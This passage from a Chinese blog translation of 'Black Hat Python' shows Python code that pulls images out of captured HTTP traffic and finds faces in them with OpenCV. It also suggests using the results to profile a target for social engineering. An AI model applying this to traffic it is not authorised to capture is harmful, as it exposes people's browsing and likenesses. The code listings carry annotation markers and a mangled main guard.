packet[TCP].sport == <span class="number">80</span>:</span><br><span class="line">                    payload += bytes(packet[TCP].payload)</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">            [<span class="number">4</span>] sys.stdout.write(<span class="string">'x'</span>)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">      <span class="keyword">if</span> payload:</span><br><span class="line">        [<span class="number">5</span>] header = get_header(payload)</span><br><span class="line">          <span class="keyword">if</span> header <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">              <span class="keyword">continue</span></span><br><span class="line">        [<span class="number">6</span>] self.responses.append(Response(header=header, payload=payload))</span><br></pre></td></tr></table></figure>

<p>在 <em>get_responses</em> 函数中，我们遍历 <em>sessions</em> 字典[1]，然后遍历每个会话中的数据包[2]。我们过滤流量，因此只得到目的端口或源端口为80的数据包[3]。然后我们将所有流量的有效负载连接到一个称为 <em>payload</em> 的缓冲区中。这与在Wireshark中右键单击一个数据包并选择Follow TCP Stream是一样的。如果我们没有成功地附加到有效负载变量(很可能是因为包中没有TCP流量)，我们将向控制台打印一个x并继续执行[4]。</p>
<p>然后，在我们重新组装HTTP数据之后，如果 <em>payload</em> 字节字符串不是空的，我们将它传递给HTTP头解析函数 <em>get_header</em> [5]，这使我们能够单独检查HTTP头。接下来，我们将Response附加到 <em>response</em> 列表[6]。</p>
<p>最后，我们遍历响应列表，如果响应包含一个图像，我们调用 <em>write</em> 函数将图像写入磁盘:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, content_name)</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">for</span> i, response <span class="keyword">in</span> enumerate(self.responses):</span><br><span class="line">    [<span class="number">2</span>] content, content_type = extract_content(response, content_name)</span><br><span class="line">        <span class="keyword">if</span> content <span class="keyword">and</span> content_type:</span><br><span class="line">            fname = os.path.join(OUTDIR, <span class="string">f'ex_<span class="subst">&#123;i&#125;</span>.<span class="subst">&#123;content_type&#125;</span>'</span>)</span><br><span class="line">            print(<span class="string">f'Writing <span class="subst">&#123;fname&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(fname, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            [<span class="number">3</span>] f.write(content)</span><br></pre></td></tr></table></figure>

<p>提取工作完成后，<em>write</em> 函数只需遍历响应[1]，提取内容[2]，并将该内容写入文件[3]。该文件在输出目录中被创建，文件名由 <em>enumerate</em> 内置函数的计数器和 <em>content_type</em> 值构成。例如，生成的图像名称可能是 <em>ex_2.jpg*。当我们运行这个程序时，我们创建一个 *Recapper</em> 对象，调用它的 <em>get_responses</em> 函数来找到pcap文件中的所有响应，然后从这些响应中提取图像写入磁盘。</p>
<p>在下一个程序中，我们将检查每一张图像，以确定它是否包含人脸。对于每个有人脸的图像，我们将它写入磁盘，并在图像中的人脸周围添加一个框。打开一个名为 <em>detect.py</em> 的新文件:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ROOT = <span class="string">'/root/Desktop/pictures'</span></span><br><span class="line">FACES = <span class="string">'/root/Desktop/faces'</span></span><br><span class="line">TRAIN = <span class="string">'/root/Desktop/training'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span><span class="params">(srcdir=ROOT, tgtdir=FACES, train_dir=TRAIN)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> fname <span class="keyword">in</span> os.listdir(srcdir):</span><br><span class="line">    [<span class="number">1</span>] <span class="keyword">if</span> <span class="keyword">not</span> fname.upper().endswith(<span class="string">'.JPG'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        fullname = os.path.join(srcdir, fname)</span><br><span class="line">        newname = os.path.join(tgtdir, fname)</span><br><span class="line">    [<span class="number">2</span>] img = cv2.imread(fullname)</span><br><span class="line">        <span class="keyword">if</span> img <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">        training = os.path.join(train_dir, <span class="string">'haarcascade_frontalface_alt.xml'</span>)</span><br><span class="line">    [<span class="number">3</span>] cascade = cv2.CascadeClassifier(training)</span><br><span class="line">        rects = cascade.detectMultiScale(gray, <span class="number">1.3</span>, <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">        [<span class="number">4</span>] <span class="keyword">if</span> rects.any():</span><br><span class="line">                print(<span class="string">'Got a face'</span>)</span><br><span class="line">            [<span class="number">5</span>] rects[:, <span class="number">2</span>:] += rects[:, :<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> AttributeError:</span><br><span class="line">            print(<span class="string">f'No faces found in <span class="subst">&#123;fname&#125;</span>.'</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># highlight the faces in the image</span></span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> rects:</span><br><span class="line">        [<span class="number">6</span>] cv2.rectangle(img, (x1, y1), (x2, y2), (<span class="number">127</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">    [<span class="number">7</span>] cv2.imwrite(newname, img)</span><br><span class="line"><span class="keyword">if</span> name == <span class="string">'__main__'</span>:</span><br><span class="line">    detect()</span><br></pre></td></tr></table></figure>

<p><em>detect</em> 函数接收源目录、目标目录和训练目录作为输入。它遍历源目录中的JPG文件。(因为我们要找的是人脸，所以图片一般是照片，所以它们最有可能保存为 <em>.jpg</em> 文件[1]。)然后我们使用OpenCV计算机视觉库 <em>cv2</em> [2]读取图像，加载 <em>detector</em> XML文件，创建 cv2 人脸检测器对象[3]。该检测器是预先训练的分类器，以检测正面人像。OpenCV包含用于轮廓(侧面)人脸检测、手、水果和一大堆其他对象的分类器，你可以自己尝试。对于发现了人脸的图像[4]，分类器将返回一个矩形的坐标，该矩形对应于人脸在图像中被检测到的位置。在这种情况下，我们向控制台打印一条消息，在人面周围画一个绿色框[6]，并将图像写入输出目录[7]。</p>
<p>从检测器返回的 <em>rects</em> 数据的形式为 (x, y, width, height) ，其中x, y值提供矩形左下角的坐标，而width, height值对应矩形的宽度和高度。</p>
<p>我们使用Python切片语法从一种形式转换为另一种形式[5]。也就是说，我们将返回的 <em>rects</em> 数据转换为实际坐标: (x1, y1, x1+width, y1+height) 或 (x1, y1, x2, y2) 。这就是 <em>cv2.rectangle</em> 类函数所期望的输入格式。</p>
<p>Chris Fidao在<a href="http://www.fideloper.com/facial-detection/" target="_blank" rel="noopener">http://www.fideloper.com/facial-detection/</a>上慷慨地分享了这个代码。这个例子对原始版本做了轻微的修改。现在让我们在你的Kali虚拟机中进行尝试。</p>
<h3 id="Kicking-the-Tires-2"><a href="#Kicking-the-Tires-2" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>如果你还没有安装OpenCV库，请在你的Kali VM的终端上运行以下命令(再次感谢Chris Fidao):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#:&gt; apt-get install libopencv-dev python3-opencv python3-numpy python3-scipy</span></span><br></pre></td></tr></table></figure>

<p>这应该会安装需要处理面部检测的结果图像所有必要的文件。我们还需要抓取面部检测训练文件，像这样:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget http://eclecti.cc/files/2008/03/haarcascade_frontalface_alt.xml</span><br></pre></td></tr></table></figure>

<p>将下载的文件复制到 <em>detector.py</em> 中的TRAIN变量指定的目录下。现在为输出创建两个目录，放入pcap，并运行脚本。这看起来应该如下所示:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#:&gt; mkdir /root/Desktop/pictures</span></span><br><span class="line"><span class="comment">#:&gt; mkdir /root/Desktop/faces</span></span><br><span class="line"><span class="comment">#:&gt; python recapper.py</span></span><br><span class="line">Extracted: 189 images</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx--------------xx</span><br><span class="line">Writing pictures/ex_2.gif</span><br><span class="line">Writing pictures/ex_8.jpeg</span><br><span class="line">Writing pictures/ex_9.jpeg</span><br><span class="line">Writing pictures/ex_15.png</span><br><span class="line">...</span><br><span class="line"><span class="comment">#:&gt; python detector.py</span></span><br><span class="line">Got a face</span><br><span class="line">Got a face</span><br><span class="line">...</span><br><span class="line"><span class="comment">#:&gt;</span></span><br></pre></td></tr></table></figure>

<p>你可能会看到OpenCV产生了许多错误消息，因为我们输入到OpenCV的一些图像可能已经损坏或部分下载而不完整，或者可能不支持它们的格式。(我们将构建健壮的图像提取和验证程序作为您的作业。)如果打开 <em>faces</em> 目录，您应该会看到几个文件，其中包含人像和绘制在它们周围的神奇的绿色框。</p>
<p>这种技术可以用来确定你的目标正在查看什么类型的内容，以及通过社会工程发现可能的方法。当然，您可以扩展这个示例而不止将其用于数据包分割的图像，可以将其与后面章节中描述的web爬虫和解析技术结合使用。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-4/">https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Black-Hat-Python-2nd/">Black_Hat_Python_2nd</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021-06/Black-Hat-Python-2nd-5/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Black Hat Python 2nd 5</div></div></a></div><div class="next-post pull-right"><a href="/2021-06/Black-Hat-Python-2nd-3/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Black Hat Python 2nd 3</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-11/" title="Black Hat Python 2nd 11"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-23</div><div class="relatedPosts_title">Black Hat Python 2nd 11</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-10/" title="Black Hat Python 2nd 10"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-20</div><div class="relatedPosts_title">Black Hat Python 2nd 10</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-9/" title="Black Hat Python 2nd 9"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-18</div><div class="relatedPosts_title">Black Hat Python 2nd 9</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-8/" title="Black Hat Python 2nd 8"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-13</div><div class="relatedPosts_title">Black Hat Python 2nd 8</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-7/" title="Black Hat Python 2nd 7"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-08</div><div class="relatedPosts_title">Black Hat Python 2nd 7</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-6/" title="Black Hat Python 2nd 6"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-03</div><div class="relatedPosts_title">Black Hat Python 2nd 6</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>